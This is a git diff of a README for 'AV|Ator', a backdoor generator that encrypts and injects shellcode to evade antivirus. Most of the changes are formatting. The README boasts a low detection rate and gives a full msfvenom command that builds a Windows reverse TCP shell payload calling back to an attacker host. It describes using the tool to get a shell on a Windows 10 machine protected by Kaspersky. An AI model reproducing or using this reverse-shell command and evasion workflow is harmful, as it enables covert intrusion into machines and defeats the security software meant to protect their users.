@@ -2,21 +2,22 @@
 
 *Current Detection Rate*: 3/71
 
-SHA-256	e6a5299d4c081140a563ff5a64a94f1543480efeb78d5036f703004d64b4bed2
+```SHA-256	e6a5299d4c081140a563ff5a64a94f1543480efeb78d5036f703004d64b4bed2
 
 File name	t9jkoek.exe
 
 File size	15.5 KB
 
 Last analysis	2019-04-29 08:26:13 UTC
+```
 
 ![Screenshot 2019-04-29 at 11 33 11](https://user-images.githubusercontent.com/4659186/56884557-d9899800-6a72-11e9-8bb5-95872da1407d.png)
 
 # AV|Ator 
 
-*Ator is a swordsman, alchemist, scientist, magician, scholar, and engineer, with the ability to sometimes produce objects out of thin air*
+*[Ator is a swordsman, alchemist, scientist, magician, scholar, and engineer, with the ability to sometimes produce objects out of thin air]* (https://en.wikipedia.org/wiki/Ator)
 
-AV|Ator is a backdoor generator utility, which uses cryptographic and injection techniques in order to bypass AV detection. More specifically:
+**AV|Ator** is a backdoor generator utility, which uses cryptographic and injection techniques in order to bypass AV detection. More specifically:
 - It uses AES encryption in order to encrypt a given shellcode 
 - Generates an executable file which contains the encrypted payload
 - The shellcode is decrypted and injected to the target system using various injection techniques 
@@ -63,7 +64,7 @@ Getting a shell in a windows 10 machine running fully updated kaspersky AV
 
 1. Create the payload using msfvenom 
 
-    msfvenom -p windows/x64/shell/reverse_tcp_rc4 LHOST=10.0.2.15 LPORT=443 EXITFUNC=thread RC4PASSWORD=S3cr3TP4ssw0rd -f csharp
+   ```msfvenom -p windows/x64/shell/reverse_tcp_rc4 LHOST=10.0.2.15 LPORT=443 EXITFUNC=thread RC4PASSWORD=S3cr3TP4ssw0rd -f csharp```
 
 2. Use AVIator with the following settings
 
@@ -93,10 +94,10 @@ Install Mono according to your linux distribution, download and run the binaries
 
 e.g. in kali:
 
-root@kali# apt install mono-devel 
+```root@kali# apt install mono-devel 
 
 root@kali# mono aviator.exe
-
+```
 
 ### Credits
 To Damon Mohammadbagher for the encryption procedure
